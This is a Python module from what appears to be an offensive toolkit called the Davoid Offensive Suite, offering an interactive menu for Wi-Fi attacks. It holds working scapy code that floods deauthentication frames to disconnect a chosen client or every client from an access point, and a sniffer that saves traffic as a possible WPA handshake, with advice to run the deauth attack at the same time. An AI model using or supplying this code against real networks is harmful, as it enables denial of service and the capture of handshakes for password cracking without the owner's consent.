# --- Module: Wireless Ops (Davoid Offensive Suite) ---
# Purpose: Layer 2 Wireless Attacks (Deauth & Handshake Capture)

import time
import os
from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp, sniff, conf, wrpcap
from rich.console import Console
from core.ui import draw_header
from core.context import ctx

console = Console()


def deauth_flood(target, bssid, iface):
    """Sends continuous deauthentication frames to kick a client."""
    # addr1=target, addr2=bssid, addr3=bssid
    dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    console.print(
        f"[bold red][!] FLOODING {target} via {bssid}... (Ctrl+C to Stop)[/bold red]")
    try:
        while True:
            sendp(packet, iface=iface, count=64, inter=0.1, verbose=False)
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Attack Halted.[/yellow]")


def run_wifi_suite():
    draw_header("Wireless Offensive Suite")

    # Pull interface from global context
    iface = ctx.get("INTERFACE")
    console.print(
        f"[cyan][*] Active Interface:[/cyan] [bold white]{iface}[/bold white]")

    console.print("\n[1] Deauth Flood (Targeted/Broadcast)")
    console.print("[2] WPA Handshake Sniffer")
    console.print("[B] Return to Main")

    choice = console.input("\n[wifi]> ").lower()

    if choice == "1":
        target = console.input(
            "[bold yellow]Target Client MAC (FF:FF:FF:FF:FF:FF for all): [/bold yellow]") or "FF:FF:FF:FF:FF:FF"
        bssid = console.input(
            "[bold yellow]Access Point BSSID (MAC): [/bold yellow]")
        if bssid:
            deauth_flood(target, bssid, iface)

    elif choice == "2":
        console.print(
            "[bold cyan][*] Sniffing for EAPOL (Handshake) packets...[/bold cyan]")
        # Filters for 4-way handshake packets
        packets = sniff(iface=iface, filter="type data", count=50, timeout=60)
        if packets:
            fname = f"handshake_{int(time.time())}.pcap"
            wrpcap(fname, packets)
            console.print(
                f"[green][+] Potential handshake saved to {fname}[/green]")
        else:
            console.print(
                "[red][!] No handshake captured. Try running a Deauth attack simultaneously.[/red]")

    input("\nPress Enter to return...")
